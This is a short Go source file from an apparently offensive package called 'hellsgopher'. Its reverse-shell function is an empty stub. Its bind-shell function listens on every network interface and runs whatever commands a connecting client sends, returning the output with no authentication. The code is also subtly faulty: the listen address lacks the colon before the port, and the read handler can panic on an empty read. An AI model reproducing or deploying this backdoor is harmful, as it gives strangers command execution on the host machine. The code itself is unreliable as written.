package hellsgopher

import (
	"net"
	"strconv"
)

// spawn a reverse shit shell. Connects to a given host over tcp. Not secure by default
func ReverseShell(rhost string, rport int) error {
	return ErrFuncNotSupported
}

// start a listener for a bind shit shell. This is not secure by defualt
func BindShell(port int) error {
	// listen for tcp connections on all interfaces
	listener, err := net.Listen("tcp", "0.0.0.0"+strconv.Itoa(port))
	if err != nil {
		return err
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			return ErrBindAccept
		}
		handleBindConn(conn)
	}
}

func handleBindConn(conn net.Conn) {
	for {
		buf := make([]byte, 1024)
		length, _ := conn.Read(buf)

		command := string(buf[:length-1])
		out, _ := CmdReturn(command)

		conn.Write([]byte(out))
	}
}
